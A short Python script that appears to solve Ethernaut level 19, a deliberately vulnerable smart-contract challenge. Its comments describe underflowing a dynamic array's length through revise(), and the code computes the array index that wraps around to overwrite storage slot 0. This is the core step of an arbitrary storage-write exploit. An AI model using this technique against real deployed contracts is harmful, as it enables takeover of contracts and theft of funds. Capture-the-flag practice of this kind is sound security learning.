from web3 import Web3

# For solving the Ethernaut problem 19. Firs we need to call revise() until the lenght of the array underflow.
# Now we can write to whatever slot in storage

hash_hex = Web3.solidity_keccak(['uint256'], [1])
decimal_num = int(hash_hex.hex(), 16)
print(hash_hex.hex())
print(decimal_num)

max_256 = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
decimal_max_256 = int(max_256, 16)


print("We need to call with:")
answer = decimal_max_256 - decimal_num + 1
print(answer)